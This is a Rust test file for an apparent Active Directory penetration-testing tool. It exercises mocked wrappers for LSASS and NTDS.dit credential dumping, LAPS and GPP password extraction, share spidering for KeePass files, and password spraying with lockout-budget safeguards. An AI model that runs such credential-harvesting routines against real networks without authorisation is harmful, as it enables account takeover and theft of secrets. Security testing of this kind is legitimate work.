    fn smbclient_spider_optional_depth() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "domain": "contoso.local",
            "depth": 3
        });
        assert_eq!(optional_i64(&args, "depth"), Some(3));
    }

    #[test]
    fn smbclient_spider_opts_construction() {
        let pattern = Some("*.kdbx");
        let depth: Option<i64> = Some(3);
        let mut opts = "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400".to_string();
        if let Some(p) = pattern {
            opts.push_str(&format!(" PATTERN={p}"));
        }
        if let Some(d) = depth {
            opts.push_str(&format!(" DEPTH={d}"));
        }
        assert_eq!(
            opts,
            "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400 PATTERN=*.kdbx DEPTH=3"
        );
    }

    // --- check_credman_entries / check_autologon_registry ---

    #[test]
    fn credman_requires_all_fields() {
        let args = json!({
            "target": "192.168.58.1",
            "username": "admin",
            "password": "P@ss",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "target").is_ok());
        assert!(required_str(&args, "username").is_ok());
        assert!(required_str(&args, "password").is_ok());
        assert!(required_str(&args, "domain").is_ok());
    }

    #[test]
    fn netexec_creds_for_password_policy() {
        let cred_args =
            credentials::netexec_creds(Some("admin"), Some("P@ss"), None, Some("contoso.local"));
        assert_eq!(cred_args[0], "-u");
        assert_eq!(cred_args[1], "admin");
        assert_eq!(cred_args[2], "-p");
        assert_eq!(cred_args[3], "P@ss");
        assert_eq!(cred_args[4], "-d");
        assert_eq!(cred_args[5], "contoso.local");
    }

    // --- username_as_password ---

    #[test]
    fn username_as_password_requires_target() {
        let args = json!({"domain": "contoso.local"});
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn username_as_password_requires_domain() {
        let args = json!({"target": "192.168.58.1"});
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn username_as_password_optional_users_file() {
        let args = json!({
            "target": "192.168.58.1",
            "domain": "contoso.local",
            "users_file": "/tmp/myusers.txt"
        });
        assert_eq!(optional_str(&args, "users_file"), Some("/tmp/myusers.txt"));
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn lsassy_with_password_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin", "password": "P@ss"
        });
        assert!(super::lsassy(&args).await.is_ok());
    }

    #[tokio::test]
    async fn lsassy_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin", "hash": "aabbccdd"
        });
        assert!(super::lsassy(&args).await.is_ok());
    }

    #[tokio::test]
    async fn lsassy_with_domain_and_method_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin", "password": "P@ss",
            "domain": "contoso.local", "method": "comsvcs"
        });
        assert!(super::lsassy(&args).await.is_ok());
    }

    #[tokio::test]
    async fn smb_login_check_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.10", "username": "localuser",
            "password": "localuser", "domain": "contoso.local"
        });
        assert!(super::smb_login_check(&args).await.is_ok());
    }

    #[tokio::test]
    async fn domain_admin_checker_executes() {
        mock::push(mock::success());
        let args = json!({
            "targets": "192.168.58.0/24", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::domain_admin_checker(&args).await.is_ok());
    }

    #[tokio::test]
    async fn domain_admin_checker_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "targets": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd", "domain": "contoso.local"
        });
        assert!(super::domain_admin_checker(&args).await.is_ok());
    }

    #[tokio::test]
    async fn gpp_password_finder_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::gpp_password_finder(&args).await.is_ok());
    }

    #[tokio::test]
    async fn sysvol_script_search_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::sysvol_script_search(&args).await.is_ok());
    }

    #[tokio::test]
    async fn laps_dump_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::laps_dump(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ldap_search_descriptions_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::ldap_search_descriptions(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ldap_search_descriptions_with_base_dn_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local",
            "base_dn": "OU=Users,DC=contoso,DC=local"
        });
        assert!(super::ldap_search_descriptions(&args).await.is_ok());
    }

    #[tokio::test]
    async fn smbclient_spider_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::smbclient_spider(&args).await.is_ok());
    }

    #[tokio::test]
    async fn smbclient_spider_with_pattern_and_depth_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local",
            "pattern": "*.kdbx", "depth": 3
        });
        assert!(super::smbclient_spider(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntds_dit_extract_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::ntds_dit_extract(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntds_dit_extract_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "hash": "aabbccdd", "domain": "contoso.local"
        });
        assert!(super::ntds_dit_extract(&args).await.is_ok());
    }

    #[tokio::test]
    async fn password_policy_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::password_policy(&args).await.is_ok());
    }

    #[tokio::test]
    async fn password_spray_with_file_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "password": "P@ss",
            "domain": "contoso.local", "users_file": "/tmp/users.txt",
            "lockout_threshold": 5
        });
        let out = super::password_spray(&args).await.unwrap();
        assert!(out.success, "expected executor to run with valid budget");
    }

    #[tokio::test]
    async fn password_spray_refuses_without_policy() {
        // No mock pushed — if the gate fails to short-circuit, executor errors
        // (and the test would fail with a different assertion).
        let args = json!({
            "target": "192.168.58.1", "password": "P@ss",
            "domain": "contoso.local"
        });
        let out = super::password_spray(&args).await.unwrap();
        assert!(!out.success, "spray must refuse without policy");
        assert!(
            out.stdout.contains("no lockout policy"),
            "expected refusal message, got: {}",
            out.stdout
        );
    }

    #[tokio::test]
    async fn password_spray_refuses_when_budget_exhausted() {
        let args = json!({
            "target": "192.168.58.1", "password": "P@ss",
            "domain": "contoso.local",
            "lockout_threshold": 5,
            "attempts_used_per_account": 4
        });
        let out = super::password_spray(&args).await.unwrap();
        assert!(!out.success, "spray must refuse when budget gone");
        assert!(
            out.stdout.contains("budget exhausted"),
            "expected budget message, got: {}",
            out.stdout
        );
    }

    #[tokio::test]
    async fn password_spray_acknowledge_no_policy_overrides() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "password": "P@ss",
            "domain": "contoso.local",
            "acknowledge_no_policy": true
        });
        let out = super::password_spray(&args).await.unwrap();
        assert!(out.success, "acknowledge_no_policy must allow spray to run");
    }

    #[tokio::test]
    async fn password_spray_threshold_zero_means_no_lockout() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "password": "P@ss",
            "domain": "contoso.local",
            "lockout_threshold": 0,
            "attempts_used_per_account": 100
        });
        let out = super::password_spray(&args).await.unwrap();
        assert!(out.success, "threshold=0 means no lockout policy in AD");
    }

    #[test]
    fn check_spray_budget_blocks_without_policy() {
        let refusal = super::check_spray_budget(None, 0, false);
        assert!(refusal.is_some());
    }

    #[test]
    fn check_spray_budget_allows_with_ack() {
        assert!(super::check_spray_budget(None, 0, true).is_none());
    }

    #[test]
    fn check_spray_budget_keeps_safety_buffer() {
        // threshold=5, used=3 -> budget = 5-3-1 = 1 (allowed)
        assert!(super::check_spray_budget(Some(5), 3, false).is_none());
        // threshold=5, used=4 -> budget = 0 (refused)
        assert!(super::check_spray_budget(Some(5), 4, false).is_some());
    }

    #[test]
    fn check_spray_budget_threshold_zero_passes() {
        assert!(super::check_spray_budget(Some(0), 100, false).is_none());
    }

    // --- sanitize_spray_userlist ---

    #[test]
    fn sanitize_spray_userlist_strips_disabled_accounts() {
        let pid = std::process::id();
        let src = format!("/tmp/sanitize_src_{pid}.txt");
        std::fs::write(
            &src,
            "Administrator\nGuest\nkrbtgt\njdoe\nDefaultAccount\nWDAGUtilityAccount\nsvc_sql\n",
        )
        .unwrap();

        let (path, owns) = super::sanitize_spray_userlist(&src);
        assert!(owns, "filtered list should be in a freshly owned temp file");
        assert_ne!(
            path, src,
            "owned filter should not return the original path"
        );

        let filtered = std::fs::read_to_string(&path).unwrap();
        assert!(filtered.contains("Administrator"));
        assert!(filtered.contains("jdoe"));
        assert!(filtered.contains("svc_sql"));
        for disabled in ["Guest", "krbtgt", "DefaultAccount", "WDAGUtilityAccount"] {
            assert!(
                !filtered.lines().any(|l| l.trim() == disabled),
                "{disabled} should be filtered out"
            );
        }

        let _ = std::fs::remove_file(&src);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn sanitize_spray_userlist_passes_through_when_clean() {
        let pid = std::process::id();
        let src = format!("/tmp/sanitize_clean_{pid}.txt");
        std::fs::write(&src, "Administrator\njdoe\nsvc_sql\n").unwrap();

        let (path, owns) = super::sanitize_spray_userlist(&src);
        assert!(!owns, "clean list should not be rewritten");
        assert_eq!(path, src, "clean list should return original path");

        let _ = std::fs::remove_file(&src);
    }

    #[test]
    fn sanitize_spray_userlist_handles_missing_file() {
        let path = "/tmp/sanitize_missing_does_not_exist.txt";
        let _ = std::fs::remove_file(path);
        let (returned, owns) = super::sanitize_spray_userlist(path);
        assert!(!owns);
        assert_eq!(returned, path);
    }

    #[test]
    fn sanitize_spray_userlist_case_insensitive() {
        let pid = std::process::id();
        let src = format!("/tmp/sanitize_case_{pid}.txt");
        std::fs::write(&src, "GUEST\nguest\nGuest\nadmin\n").unwrap();

        let (path, owns) = super::sanitize_spray_userlist(&src);
        assert!(owns);
        let filtered = std::fs::read_to_string(&path).unwrap();
        assert!(filtered.contains("admin"));
        assert!(!filtered.to_lowercase().contains("guest"));

        let _ = std::fs::remove_file(&src);
        let _ = std::fs::remove_file(&path);
    }

    #[tokio::test]
    async fn username_as_password_with_file_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "domain": "contoso.local",
            "users_file": "/tmp/users.txt"
        });
        assert!(super::username_as_password(&args).await.is_ok());
    }

    #[test]
    fn drop_excluded_users_strips_listed_entries() {
        let pid = std::process::id();
        let src = format!("/tmp/excl_src_{pid}.txt");
        std::fs::write(&src, "Administrator\ntestuser1\ntestuser2\nguest\n").unwrap();

        let (path, owns) = super::drop_excluded_users(&src, "testuser1, guest");
        assert!(owns);
        assert_ne!(path, src);
        let filtered = std::fs::read_to_string(&path).unwrap();
        assert!(filtered.contains("Administrator"));
        assert!(filtered.contains("testuser2"));
        assert!(!filtered
            .lines()
            .any(|l| l.trim().eq_ignore_ascii_case("testuser1")));
        assert!(!filtered
            .lines()
            .any(|l| l.trim().eq_ignore_ascii_case("guest")));

        let _ = std::fs::remove_file(&src);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn drop_excluded_users_empty_list_passes_through() {
        let pid = std::process::id();
        let src = format!("/tmp/excl_empty_{pid}.txt");
        std::fs::write(&src, "Administrator\ntestuser1\n").unwrap();

        let (path, owns) = super::drop_excluded_users(&src, "");
        assert!(!owns);
        assert_eq!(path, src);

        let _ = std::fs::remove_file(&src);
    }

    #[test]
    fn drop_excluded_users_no_matches_passes_through() {
        let pid = std::process::id();
        let src = format!("/tmp/excl_nomatch_{pid}.txt");
        std::fs::write(&src, "Administrator\ntestuser1\n").unwrap();

        let (path, owns) = super::drop_excluded_users(&src, "testuser2,testuser3");
        assert!(!owns);
        assert_eq!(path, src);

        let _ = std::fs::remove_file(&src);
    }

    #[test]
    fn drop_excluded_users_case_insensitive() {
        let pid = std::process::id();
        let src = format!("/tmp/excl_case_{pid}.txt");
        std::fs::write(&src, "TESTUSER1\ntestuser1\nadmin\n").unwrap();

        let (path, owns) = super::drop_excluded_users(&src, "testuser1");
        assert!(owns);
        let filtered = std::fs::read_to_string(&path).unwrap();
        assert!(filtered.contains("admin"));
        assert!(!filtered.to_lowercase().contains("testuser1"));

        let _ = std::fs::remove_file(&src);
        let _ = std::fs::remove_file(&path);
    }

    #[tokio::test]
    async fn check_credman_entries_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::check_credman_entries(&args).await.is_ok());
    }

    #[tokio::test]
    async fn check_autologon_registry_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "username": "admin",
            "password": "P@ss", "domain": "contoso.local"
        });
        assert!(super::check_autologon_registry(&args).await.is_ok());
    }
}
